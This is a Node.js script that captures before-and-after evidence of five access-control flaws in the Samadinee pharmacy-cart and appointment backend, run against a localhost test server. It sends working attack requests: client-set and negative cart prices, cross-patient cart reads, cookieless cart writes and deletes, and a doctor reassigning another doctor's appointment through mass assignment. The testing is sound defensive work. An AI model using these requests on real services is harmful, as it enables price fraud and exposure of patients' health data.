// Evidence capture for V-11 to V-15 (Samadinee — pricing, cart and appointment access control).
//
// Start the disposable server first, in another terminal:
//
//     cd backend && npm run dev:test
//
// Then, from the repo root:
//
//     node security-tests/capture-v11-v15.mjs            -> writes before.txt in each folder
//     node security-tests/capture-v11-v15.mjs --after    -> writes after.txt in each folder
//
// Capture "before" on unfixed code, and "after" with your fix branch checked out,
// repeating the identical steps. See security-tests/README.md.
//
// Localhost only. Every request goes to the server named in .tokens.json, which the
// dev server pins to http://localhost:4000. Nothing here touches a remote host.
//
// Order matters. Reads run before writes so each check sees the seeded data:
// V-15 reads the appointment before V-14 overwrites it, and V-13 reads Bobby's
// cart before V-12 deletes it. Restart the dev server before every run so the
// seed is fresh. /payment/checkout is never called: it crashes the server (V-06).
//
// Each finding runs several attacks (the numbered ATTACK/CONTROL steps), so the
// evidence covers the whole finding, not one request. Requests are sent with
// Node's fetch(), not curl. Each "> fetch METHOD url" line is the request this
// script really sent. For the same attacks run with the curl binary, see
// curl-v11-v15.sh and the *-curl.txt files it writes.

import fs from "node:fs/promises";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { fileURLToPath } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(here, "..");
const mode = process.argv.includes("--after") ? "after" : "before";

let tokens;
try {
    tokens = JSON.parse(await fs.readFile(path.join(here, ".tokens.json"), "utf8"));
} catch {
    console.error("\n  Could not read security-tests/.tokens.json");
    console.error("  Start the test server first:  cd backend && npm run dev:test\n");
    process.exit(1);
}

const BASE = tokens.baseUrl;
const { accounts: acc, ids } = tokens;

// --- small helpers -----------------------------------------------------------

async function call(method, route, { cookie, body } = {}) {
    const headers = {};
    if (cookie) headers.Cookie = cookie;
    if (body) headers["Content-Type"] = "application/json";
    const res = await fetch(BASE + route, {
        method,
        headers,
        body: body ? JSON.stringify(body) : undefined,
        redirect: "manual",
    });
    const text = await res.text();
    let json;
    try {
        json = JSON.parse(text);
    } catch {
        json = undefined;
    }
    return { status: res.status, text, json };
}

const git = (args) => execFileSync("git", args, { cwd: repoRoot, encoding: "utf8" }).trim();
const clip = (s, n = 900) => (s.length > n ? `${s.slice(0, n)}\n… [truncated, ${s.length} bytes total]` : s);
const indent = (s) => s.split("\n").map((l) => `  ${l}`);
const show = (res) => [`  HTTP ${res.status}`, ...indent(clip(res.text))];
const who = (name) => `${name} (${acc[name].role}, id ${acc[name].id})`;
const ck = (name) => `[with ${name}'s session cookie]`;
const verdict = (bad, badMsg, goodMsg) => `  RESULT: ${bad ? `⚠️  ${badMsg}` : `✅ ${goodMsg}`}`;

// Lines of source that contain a pattern, as "file:line: text".
async function grepSource(file, pattern) {
    const lines = (await fs.readFile(path.join(repoRoot, file), "utf8")).split("\n");
    return lines
        .map((l, i) => [i + 1, l])
        .filter(([, l]) => pattern.test(l))
        .map(([n, l]) => `  ${file}:${n}:  ${l.trim()}`);
}

// The one real, seeded medicine — used for the V-11 price comparison. Its id is
// in .tokens.json. (The search and discount endpoints can't help here: the dev
// server sets sanitizeFilter=true to mirror V-07, which turns their $regex query
// into a CastError, so /medicines/get/:id is the reliable read.)
async function realMedicine() {
    const res = await call("GET", `/api/v1/medicines/get/${ids.medicineId}`);
    const m = res.json?.data;
    if (!m) throw new Error(`could not fetch the seeded medicine ${ids.medicineId} (HTTP ${res.status})`);
    return m;
}

// A fresh, valid 24-hex ObjectId for an auxiliary cart row. The cart stores
// medicineId as a reference without checking it exists, so a distinct id per
// attack is all the add/remove toggle needs to avoid colliding with other rows.
const newMedicineId = () => randomBytes(12).toString("hex");

// --- the checks --------------------------------------------------------------

async function v11(medA, medBId) {
    // ATTACK 1 — a total of 1 for 99 items.
    const qty = 99;
    // The app prices a line as quantity x (price - discount) (see frontend
    // Api/index.js), so the honest total subtracts the discount too.
    const unit = Math.max(0, medA.price - (medA.discount || 0));
    const honest = unit * qty;
    const body1 = { userId: acc.dana.id, medicineId: medA._id, quantity: qty, totalPrice: 1, status: "Pending" };
    const res1 = await call("POST", "/api/v1/medicines-cart/add-to-cart", { cookie: acc.dana.cookie, body: body1 });
    const s1 = res1.json?.data;

    // ATTACK 2 — a negative total. The model only checks the field is present
    // (!totalPrice), and -500 is truthy, so a negative price is stored as-is.
    const body2 = { userId: acc.dana.id, medicineId: medBId, quantity: 2, totalPrice: -500, status: "Pending" };
    const res2 = await call("POST", "/api/v1/medicines-cart/add-to-cart", { cookie: acc.dana.cookie, body: body2 });
    const s2 = res2.json?.data;

    return {
        folder: "v11-client-side-price",
        title: "V-11 The client decides the price and the server stores it",
        lines: [
            "WHAT THIS PROVES",
            "  The cart never looks the price up. Whatever totalPrice the browser sends is",
            "  saved as-is — a total of 1 for 99 items, or even a negative total.",
            "",
            "METHOD: black box (request tampering, sent by this Node script) + white box (read the source)",
            `  attacker : ${who("dana")}`,
            "",
            "STEP 1 — the real price, from the server's own catalogue",
            `> fetch GET $BASE/api/v1/medicines/get/${medA._id}`,
            `  "${medA.name}"  price ${medA.price}  discount ${medA.discount || 0}  (id ${medA._id})`,
            `  ${qty} x (${medA.price} - ${medA.discount || 0}) = ${honest}   <-- what the total should be`,
            "",
            `ATTACK 1 — send a total of 1 instead of ${honest}`,
            `> fetch POST $BASE/api/v1/medicines-cart/add-to-cart ${ck("dana")}`,
            `  body: ${JSON.stringify(body1)}`,
            ...show(res1),
            s1
                ? verdict(s1.totalPrice !== honest,
                    `client price accepted: stored quantity=${s1.quantity}, totalPrice=${s1.totalPrice} (honest total is ${honest})`,
                    `server recalculated to ${s1.totalPrice} (honest total ${honest}) — price not client-controlled`)
                : `  RESULT: nothing stored (HTTP ${res1.status}) — the tampered price was refused`,
            "",
            "ATTACK 2 — send a NEGATIVE total (-500)",
            `> fetch POST $BASE/api/v1/medicines-cart/add-to-cart ${ck("dana")}`,
            `  body: ${JSON.stringify(body2)}`,
            ...show(res2),
            s2
                ? verdict(s2.totalPrice < 0,
                    `negative total accepted: stored totalPrice=${s2.totalPrice}`,
                    `negative total rejected or corrected (stored ${s2.totalPrice})`)
                : `  RESULT: nothing stored (HTTP ${res2.status}) — the negative price was refused`,
            "",
            "WHITE BOX — where the cart total comes from",
            ...(await grepSource("backend/src/controllers/UserCart.controller.js", /totalPrice|Medicine\.findById|unitPrice/)),
            "",
            "  Before the fix the stored totalPrice was taken straight from req.body.",
            "  After the fix the server looks the Medicine up and computes the total itself,",
            "  so the lines above show Medicine.findById / unitPrice instead of a client value.",
            "",
            "  The Razorpay order amount still reads req.body.amount:",
            ...(await grepSource("backend/src/controllers/payment.controller.js", /amount:/)),
            "  Fixing the /payment/checkout side is tracked with V-06 (that endpoint crashes",
            "  until the Razorpay client is wired up), so the live proof here is the cart.",
            "",
            "NOT TESTED — /payment/checkout",
            "  Calling it crashes the whole server (V-06: `instance` is never defined), so the",
            "  payment side is shown from the source only. The cart side above is the live proof.",
        ],
    };
}

async function v13() {
    // ATTACK 1 — Dana reads Bobby's cart.
    const own = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.dana.id}`, { cookie: acc.dana.cookie });
    const danaSeesBobby = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.bobby.id}`, { cookie: acc.dana.cookie });
    const danaRows = (danaSeesBobby.json?.data ?? []).filter((r) => r.userId === acc.bobby.id);

    // ATTACK 2 — a different patient (Carol) reads Bobby's cart too, to show it
    // is not specific to one attacker: ANY logged-in patient can do this.
    const carolSeesBobby = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.bobby.id}`, { cookie: acc.carol.cookie });
    const carolRows = (carolSeesBobby.json?.data ?? []).filter((r) => r.userId === acc.bobby.id);

    return {
        folder: "v13-cart-idor",
        title: "V-13 IDOR: one patient can read another patient's cart",
        lines: [
            "WHAT THIS PROVES",
            "  The cart route checks that you are *a* patient, but not *which* patient. The",
            "  user ID comes from the URL, so any logged-in patient can read anyone's cart.",
            "",
            "METHOD: black box — two different attackers, swap the victim's ID into the URL",
            `  victim    : ${who("bobby")}  (seed puts one private row in his cart)`,
            "",
            "CONTROL — Dana reads her own cart (this must always work)",
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.dana.id} ${ck("dana")}`,
            ...show(own),
            "",
            `ATTACK 1 — ${who("dana")} asks for Bobby's cart, with her own cookie`,
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.bobby.id} ${ck("dana")}`,
            ...show(danaSeesBobby),
            verdict(danaRows.length > 0,
                `${danaRows.length} of Bobby's row(s) returned to Dana — quantity ${danaRows[0]?.quantity}, totalPrice ${danaRows[0]?.totalPrice}, status ${danaRows[0]?.status}`,
                `no rows of Bobby's returned (HTTP ${danaSeesBobby.status}) — Dana got only her own cart, access to Bobby's refused`),
            "",
            `ATTACK 2 — a second, unrelated patient ${who("carol")} does the same`,
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.bobby.id} ${ck("carol")}`,
            ...show(carolSeesBobby),
            verdict(carolRows.length > 0,
                `Carol also received ${carolRows.length} of Bobby's row(s) — any patient can read any cart`,
                `Carol received none of Bobby's rows (HTTP ${carolSeesBobby.status}) — access refused`),
            "",
            "WHITE BOX — the ID the query trusts",
            ...(await grepSource("backend/src/controllers/UserCart.controller.js", /req\.params\.userId|const \{ userId/)),
            "",
            "  Neither line compares the ID with req.user._id, the user the session belongs to.",
        ],
    };
}

async function v12(medAnonId, medDoctorId) {
    // CONTROL — the one guarded route, with no cookie.
    const guarded = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.bobby.id}`);

    // ATTACK 1 — write into Bobby's cart with NO cookie at all.
    const addBody = { userId: acc.bobby.id, medicineId: medAnonId, quantity: 5, totalPrice: 500, status: "Pending" };
    const add = await call("POST", "/api/v1/medicines-cart/add-to-cart", { body: addBody });

    // ATTACK 2 — delete Bobby's seeded cart row with NO cookie.
    const del = await call("DELETE", `/api/v1/medicines-cart/delete-from-cart/${ids.cartId}`);

    // ATTACK 3 — the add route does not even check the role: a DOCTOR's cookie
    // (never a patient) can still write into a patient's cart.
    const wrongRoleBody = { userId: acc.bobby.id, medicineId: medDoctorId, quantity: 1, totalPrice: 999, status: "Pending" };
    const wrongRole = await call("POST", "/api/v1/medicines-cart/add-to-cart", { cookie: acc.alpha.cookie, body: wrongRoleBody });

    // CONFIRM — Bobby logs in and looks at his own cart.
    const after = await call("GET", `/api/v1/medicines-cart/user-cart/${acc.bobby.id}`, { cookie: acc.bobby.cookie });
    const rows = after.json?.data ?? [];
    const seededGone = !rows.some((r) => r._id === ids.cartId);
    const plantedAnon = rows.some((r) => r.medicineId === medAnonId);
    const plantedDoctor = rows.some((r) => r.medicineId === medDoctorId);

    return {
        folder: "v12-cart-no-auth",
        title: "V-12 Two of the three cart routes have no login check",
        lines: [
            "WHAT THIS PROVES",
            "  The login middleware is imported in UserCart.routes.js but applied to only one",
            "  of its three routes. Adding to and deleting from any cart needs no login at all,",
            "  and the add route does not check the caller's role either.",
            "",
            "METHOD: black box — requests with NO cookie (and one with the wrong role),",
            "        then confirm with the victim's own view",
            `  victim : ${who("bobby")}`,
            "",
            "THE ROUTE FILE",
            ...(await grepSource("backend/src/routes/UserCart.routes.js", /^router\./)),
            "",
            "CONTROL — the one guarded route, no cookie (this SHOULD be refused)",
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.bobby.id} [no cookie]`,
            ...show(guarded),
            "",
            "ATTACK 1 — write into Bobby's cart, no cookie",
            `> fetch POST $BASE/api/v1/medicines-cart/add-to-cart [no cookie]`,
            `  body: ${JSON.stringify(addBody)}`,
            ...show(add),
            "",
            "ATTACK 2 — delete Bobby's seeded cart row, no cookie",
            `> fetch DELETE $BASE/api/v1/medicines-cart/delete-from-cart/${ids.cartId} [no cookie]`,
            ...show(del),
            "",
            `ATTACK 3 — write into Bobby's cart with a DOCTOR's cookie (wrong role)`,
            `> fetch POST $BASE/api/v1/medicines-cart/add-to-cart ${ck("alpha")}`,
            `  body: ${JSON.stringify(wrongRoleBody)}`,
            ...show(wrongRole),
            "",
            "CONFIRM — Bobby logs in and looks at his own cart",
            `> fetch GET $BASE/api/v1/medicines-cart/user-cart/${acc.bobby.id} ${ck("bobby")}`,
            ...show(after),
            "",
            verdict(plantedAnon, "row planted by an ANONYMOUS request is present in Bobby's cart", "no anonymous row was planted"),
            verdict(seededGone, `Bobby's seeded row ${ids.cartId} was deleted anonymously`, `Bobby's seeded row ${ids.cartId} survived`),
            verdict(plantedDoctor, "row planted with a DOCTOR's cookie is present in Bobby's cart", "the wrong-role write was refused"),
            "",
            "TOOLING NOTE",
            "  Semgrep and njsscan do not flag this — nothing in the code *text* is wrong; the",
            "  bug is a middleware that is missing. Found by reading the route file, proven with live requests.",
        ],
    };
}

async function v15() {
    // ATTACK — an unrelated doctor asks for every appointment.
    const res = await call("GET", "/api/v1/appointment/getall", { cookie: acc.alpha.cookie });
    const list = res.json?.data ?? [];
    const foreign = list.filter((a) => a.doctor !== acc.alpha.id);
    const a = foreign[0];

    // CONTROL — a patient cannot reach the route at all (the role guard that
    // DOES exist), to make clear the missing check is ownership, not the role.
    const patient = await call("GET", "/api/v1/appointment/getall", { cookie: acc.dana.cookie });

    return {
        folder: "v15-doctor-sees-all-appointments",
        title: "V-15 Every doctor can read every patient's appointments",
        lines: [
            "WHAT THIS PROVES",
            "  getAllAppointments() runs Appointment.find() with no filter. Any doctor receives",
            "  every appointment in the system, including patients they have never treated.",
            "",
            "METHOD: black box — log in as a doctor unrelated to the seeded appointment",
            `  caller      : ${who("alpha")}`,
            `  appointment : ${ids.appointmentId}  — patient Alice, booked with Dr Beta (id ${acc.beta.id})`,
            "",
            "ATTACK — Dr Alpha, unrelated to the appointment, lists every appointment",
            `> fetch GET $BASE/api/v1/appointment/getall ${ck("alpha")}`,
            ...show(res),
            verdict(!!a,
                `${foreign.length} appointment(s) belonging to other doctors returned to Dr Alpha.\n` +
                `          Exposed: patient "${a?.patientFirstName} ${a?.patientLastName}", city ${a?.city}, pincode ${a?.pincode},\n` +
                `          date ${a?.appointmentDate}, department "${a?.department}".`,
                `no other doctor's appointments returned (HTTP ${res.status}) — scoped to the caller`),
            "",
            "CONTROL — a patient (Dana) tries the same route (the role guard that DOES exist)",
            `> fetch GET $BASE/api/v1/appointment/getall ${ck("dana")}`,
            ...show(patient),
            verdict(patient.status === 200,
                "a patient reached the doctor route too",
                `patient blocked (HTTP ${patient.status}) — the role check works; the MISSING check is per-doctor ownership`),
            "",
            "WHITE BOX",
            ...(await grepSource("backend/src/controllers/appointment.controller.js", /Appointment\.find\(/)),
            "",
            "  A patient's name, location and medical department (Oncology) is health data.",
            "  Compare the original README's claim of \"safeguarding sensitive patient data\".",
        ],
    };
}

async function v14() {
    // ATTACK 1 — a doctor overwrites unrelated fields on another doctor's appointment.
    const body1 = {
        status: "Accepted",
        appointmentCharges: "1",
        city: "HACKED",
        department: "HACKED-DEPT",
        patientFirstName: "Overwritten",
    };
    const res1 = await call("PUT", `/api/v1/appointment/update/${ids.appointmentId}`, { cookie: acc.alpha.cookie, body: body1 });
    const d1 = res1.json?.data;
    const written = d1 ? Object.keys(body1).filter((k) => d1[k] === body1[k]) : [];

    // ATTACK 2 — reassign the appointment's owner. Sending `doctor` in the body
    // lets Dr Alpha steal Dr Beta's appointment for himself (mass assignment of
    // the very field that should decide ownership).
    const body2 = { doctor: acc.alpha.id };
    const res2 = await call("PUT", `/api/v1/appointment/update/${ids.appointmentId}`, { cookie: acc.alpha.cookie, body: body2 });
    const d2 = res2.json?.data;
    const stolen = d2 ? d2.doctor === acc.alpha.id : false;

    // CONTROL — a patient cannot reach the update route (role guard that exists).
    const patient = await call("PUT", `/api/v1/appointment/update/${ids.appointmentId}`, { cookie: acc.dana.cookie, body: { status: "Rejected" } });

    return {
        folder: "v14-appointment-mass-assignment",
        title: "V-14 Any doctor can rewrite any field of any appointment",
        lines: [
            "WHAT THIS PROVES",
            "  updateAppointmentStatus() passes the whole request body to findByIdAndUpdate().",
            "  Nothing limits it to the status field, and nothing checks that the appointment",
            "  belongs to the doctor making the request — so a doctor can even reassign it.",
            "",
            "METHOD: black box — a doctor edits another doctor's appointment, adding extra fields",
            `  caller      : ${who("alpha")}`,
            `  appointment : ${ids.appointmentId}  — patient Alice, booked with Dr Beta (id ${acc.beta.id})`,
            "  seeded values: patientFirstName \"Alice\", appointmentCharges \"3000\", city \"Kandy\",",
            "                 department \"Oncology\", status \"Pending\", doctor = Dr Beta",
            "",
            "ATTACK 1 — send fields other than status (mass assignment)",
            `> fetch PUT $BASE/api/v1/appointment/update/${ids.appointmentId} ${ck("alpha")}`,
            `  body: ${JSON.stringify(body1)}`,
            ...show(res1),
            verdict(!!d1 && written.length > 1,
                d1
                    ? `${written.length} of ${Object.keys(body1).length} submitted fields written: ${written.join(", ")}\n` +
                      `          on an appointment whose doctor is ${d1.doctor}, by Dr Alpha (${acc.alpha.id}).`
                    : `no fields written (HTTP ${res1.status})`,
                d1
                    ? `only ${written.join(", ") || "no"} field(s) written — extra fields ignored`
                    : `update refused (HTTP ${res1.status}) — a doctor cannot edit another doctor's appointment`),
            "",
            "ATTACK 2 — reassign the owner: set doctor = Dr Alpha, stealing Dr Beta's appointment",
            `> fetch PUT $BASE/api/v1/appointment/update/${ids.appointmentId} ${ck("alpha")}`,
            `  body: ${JSON.stringify(body2)}`,
            ...show(res2),
            verdict(stolen,
                `appointment owner is now Dr Alpha (${acc.alpha.id}) — it was Dr Beta (${acc.beta.id})`,
                `owner not reassigned (HTTP ${res2.status}) — the doctor field is ignored and a foreign doctor is refused`),
            "",
            "CONTROL — a patient (Dana) tries to update the appointment (role guard that exists)",
            `> fetch PUT $BASE/api/v1/appointment/update/${ids.appointmentId} ${ck("dana")}`,
            ...show(patient),
            verdict(patient.status === 200,
                "a patient reached the doctor-only update route",
                `patient blocked (HTTP ${patient.status}) — the role check works; the MISSING checks are field-scoping and ownership`),
            "",
            "WHITE BOX",
            ...(await grepSource("backend/src/controllers/appointment.controller.js", /findByIdAndUpdate\(id, req\.body/)),
            "",
            "  The function is named \"update status\", but req.body goes to the database whole.",
        ],
    };
}

// --- run and write -----------------------------------------------------------

let branch = "?";
let commit = "?";
try {
    branch = git(["rev-parse", "--abbrev-ref", "HEAD"]);
    commit = git(["rev-parse", "--short", "HEAD"]);
} catch {
    // not fatal: evidence still records everything else
}

// The real seeded medicine for the V-11 price comparison, plus three distinct
// throwaway ids so no cart add/remove toggle collides between attacks:
//   realMed -> V-11 attack 1 (real total)   negId -> V-11 attack 2 (negative total)
//   anonId  -> V-12 anon add                doctorId -> V-12 wrong-role add
const realMed = await realMedicine();
const negId = newMedicineId();
const anonId = newMedicineId();
const doctorId = newMedicineId();
const results = [];
results.push(await v11(realMed, negId));
results.push(await v13()); // reads Bobby's cart before V-12 deletes from it
results.push(await v12(anonId, doctorId));
results.push(await v15()); // reads the appointment before V-14 overwrites it
results.push(await v14());

const stamp = new Date().toISOString();
for (const r of results) {
    const header = [
        r.title,
        "=".repeat(r.title.length),
        "",
        `state    : ${mode.toUpperCase()} the fix`,
        `captured : ${stamp}`,
        `branch   : ${branch}`,
        `commit   : ${commit}`,
        `tool     : Node.js ${process.version} fetch() — requests sent by security-tests/capture-v11-v15.mjs`,
        `           (the same attacks with the real curl binary: ${mode}-curl.txt in this folder)`,
        `target   : ${BASE}  (disposable in-memory database, localhost only)`,
        "",
        "-".repeat(78),
    ];
    const dir = path.join(here, r.folder);
    await fs.mkdir(dir, { recursive: true });
    await fs.writeFile(path.join(dir, `${mode}.txt`), [...header, ...r.lines, ""].join("\n"));
    console.log(`  wrote ${path.relative(repoRoot, path.join(dir, `${mode}.txt`))}`);
}
